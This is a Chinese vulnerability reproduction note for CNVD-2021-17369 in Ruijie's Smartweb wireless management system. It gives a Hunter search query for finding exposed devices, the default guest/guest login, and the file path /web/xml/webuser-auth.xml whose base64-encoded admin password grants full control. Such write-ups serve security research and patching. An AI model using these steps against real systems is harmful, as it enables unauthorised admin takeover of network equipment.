# 锐捷Smartweb管理系统 密码信息泄露漏洞 CNVD-2021-17369

**一、漏洞简介**  
<font style="color:rgb(31, 35, 40);">锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。</font>  
**二、影响版本**  
<font style="color:rgb(31, 35, 40);">锐捷网络股份有限公司 无线smartweb管理系统</font>  
**<font style="color:rgb(31, 35, 40);">三、资产测绘</font>**  
●hunterweb.body="img/free_login_ge.gif"&&web.body="./img/login_bg.gif"  
●登录页面  


![1693030700475-392f4913-2fd5-45e8-a33b-c5eb742be387.png](./img/-3rJ7WzmMGCuOLN8/1693030700475-392f4913-2fd5-45e8-a33b-c5eb742be387-027436.webp)

  
**四、漏洞复现**  
<font style="color:rgb(31, 35, 40);">使用默认口令guest/guest登录系统</font>

![1710772684782-0092c42f-f067-4e1b-a3ec-8f0c2ecd4567.png](./img/-3rJ7WzmMGCuOLN8/1710772684782-0092c42f-f067-4e1b-a3ec-8f0c2ecd4567-711528.png)

<font style="color:rgb(31, 35, 40);">之后访问</font>

```java
/web/xml/webuser-auth.xml
```

![1710772700000-43f9f7d1-b323-4efa-b957-c54795239ba9.png](./img/-3rJ7WzmMGCuOLN8/1710772700000-43f9f7d1-b323-4efa-b957-c54795239ba9-191395.png)

base64解码解密后登录admin权限后台

![1710772786397-1c7129d9-d939-4185-83df-ffdd78bd226b.png](./img/-3rJ7WzmMGCuOLN8/1710772786397-1c7129d9-d939-4185-83df-ffdd78bd226b-444894.png)



> 更新: 2024-06-24 11:42:27  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cg198cbfykmz8637>